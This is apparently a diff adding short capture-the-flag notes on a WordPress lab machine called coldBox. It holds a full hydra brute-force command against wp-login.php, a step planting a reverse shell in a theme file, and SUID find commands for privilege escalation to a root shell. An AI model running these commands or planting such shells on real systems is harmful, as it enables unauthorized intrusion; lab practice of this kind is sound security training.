@@ -1,0 +1,30 @@
+coldBox - Linux Machine 
+
+Enumeration: 
+    - Word press machine ran on port 80
+
+    - SSH ubuntu ran on port 4512 
+
+
+Web app enumeration: 
+    - gobuster on port 80, led me to a hidden directory with a note that 
+    a users password was changed recently. It may be weak so I am brute forcing the login page
+
+
+wp-login.php brute force:
+    - hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f 192.168.198.239 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"
+
+
+
+Web app Exploitation: 
+
+    - log in as c0ldd
+    - edit theme files for twentyfifteen
+    - replace index.php w reverse.php
+
+Privilege Escalation: 
+    - find / -type f -perm -u=s -ls 2>/dev/null
+    - /usr/bin/find . -exec /bin/sh -p \; -quit
+
+
+
